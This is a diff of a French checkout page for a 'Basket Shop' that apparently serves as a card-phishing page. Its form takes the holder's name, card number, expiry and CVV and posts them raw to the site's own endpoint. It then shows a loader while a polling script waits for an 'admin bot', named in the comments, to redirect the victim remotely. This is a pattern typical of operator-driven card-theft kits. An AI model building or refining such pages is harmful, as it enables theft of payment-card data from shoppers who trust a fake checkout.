@@ -1,63 +1,100 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Paiement</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement - Basket Shop</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f6f6f6; padding: 40px; text-align:center; }
-    .card { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-    input { display:block; width:100%; margin:10px 0; padding:10px; border-radius:8px; border:1px solid #ccc; }
-    button { background:#28a745; color:white; border:none; padding:12px 20px; border-radius:8px; cursor:pointer; width:100%; }
-    button:hover { background:#218838; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      color: #333;
+      text-align: center;
+      padding-top: 60px;
+    }
+    h1 {
+      color: #222;
+    }
+    form {
+      display: inline-block;
+      background: white;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin-top: 30px;
+      width: 320px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 18px;
+      border-radius: 6px;
+      font-size: 1em;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>💳 Paiement sécurisé</h2>
-    <form id="paymentForm">
-      <input type="text" name="nomTitulaire" placeholder="Nom du titulaire" required>
-      <input type="text" name="cardNumber" placeholder="Numéro de carte" maxlength="19" required>
-      <input type="text" name="expiry" placeholder="MM/AA" required>
-      <input type="text" name="cvv" placeholder="CVV" maxlength="4" required>
-      <button type="submit">✅ Continuer vers paiement accepté</button>
-    </form>
-  </div>
+  <h1>💳 Paiement sécurisé</h1>
+  <p>Entrez vos informations de paiement pour finaliser votre commande.</p>
+
+  <form id="paymentForm">
+    <input type="text" id="nomTitulaire" placeholder="Nom du titulaire" required />
+    <input type="text" id="cardNumber" placeholder="Numéro de carte" maxlength="19" required />
+    <input type="text" id="expiry" placeholder="Date d’expiration (MM/AA)" required />
+    <input type="text" id="cvv" placeholder="CVV" maxlength="4" required />
+    <button type="submit">Payer maintenant 💳</button>
+  </form>
 
   <script>
     document.getElementById('paymentForm').addEventListener('submit', async (e) => {
       e.preventDefault();
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiry = document.getElementById('expiry').value;
+      const cvv = document.getElementById('cvv').value;
+      const nomTitulaire = document.getElementById('nomTitulaire').value;
 
-      const form = e.target;
-      const data = {
-        nomTitulaire: form.nomTitulaire.value,
-        cardNumber: form.cardNumber.value,
-        expiry: form.expiry.value,
-        cvv: form.cvv.value
-      };
+      try {
+        // Envoie les infos au serveur
+        await fetch('/api/payment', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ cardNumber, expiry, cvv, nomTitulaire })
+        });
 
-      // Envoi des données au serveur
-      const res = await fetch('/api/payment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-
-      const json = await res.json();
-      if (json.ok) {
-        // ✅ Redirection immédiate vers "accepted.html"
-        window.location.href = '/accepted.html';
-      } else {
-        alert('Erreur de paiement, réessayez.');
+        // Redirige vers le loader
+        window.location.href = '/loader.html';
+      } catch (err) {
+        alert("Erreur lors de l'envoi du paiement");
       }
     });
 
-    // Vérification télécommande (redirection bot)
-    setInterval(async () => {
+    // Vérifie si le bot admin a redirigé l'utilisateur
+    async function checkStatus() {
       const res = await fetch('/api/status');
       const data = await res.json();
-      if (data.redirect) window.location.href = data.redirect;
-    }, 3000);
+      if (data.redirect) {
+        window.location.href = data.redirect;
+      } else {
+        setTimeout(checkStatus, 2000);
+      }
+    }
+    checkStatus();
   </script>
 </body>
 </html>
